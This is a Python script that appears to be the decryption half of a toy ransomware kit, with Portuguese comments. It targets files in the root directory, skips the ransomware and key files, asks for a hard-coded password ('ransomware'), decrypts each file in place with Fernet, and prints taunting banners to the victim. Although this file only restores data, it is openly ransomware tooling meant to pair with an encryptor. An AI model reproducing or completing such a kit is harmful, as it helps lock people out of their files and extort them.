#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#ENTRANDO NO DIRETORIO PARA DESCRIPTOGRAFAR

diretorio_alvo = "/"

os.chdir(diretorio_alvo)

# DESCRIPTANDO

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "chave.key" or file == "decrypted.py":
		continue
	if os.path.isfile(file):
		files.append(file)


with open("chave.key", "rb") as key:
		secretkey = key.read()

secretphrase = "ransomware"

user_phrase = input("put the password to decrypt your files:\n")

if user_phrase == secretphrase:

	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		content_decrypted = Fernet(secretkey).decrypt(content)
		with open(file, "wb") as thefile:
			thefile.write(content_decrypted)

	print ("| _\| __/ _/ _ \ `v' / _,\_   _| __| _\/ \ ")
	print ("| v | _| \_| v /`. .'| v_/ | | | _|| v \_/ ")
	print ("|__/|___\__/_|_\ !_! |_|   |_| |___|__/(_) ")

	print ("YOU CAN CLEAN YOUR PANTS, YOUR FILES HAVE BEEN DECRYPTED")

else:

	print ("  __   __  ___ _____   __  _   __  _    ")
	print ("/' _/ /__\| _ \ _ \ `v' / | | /__\| |   ")
	print ("`._`.| \/ | v / v /`. .'  | || \/ | |_  ")
	print ("|___/ \__/|_|_\_|_\ !_!   |___\__/|___| ")
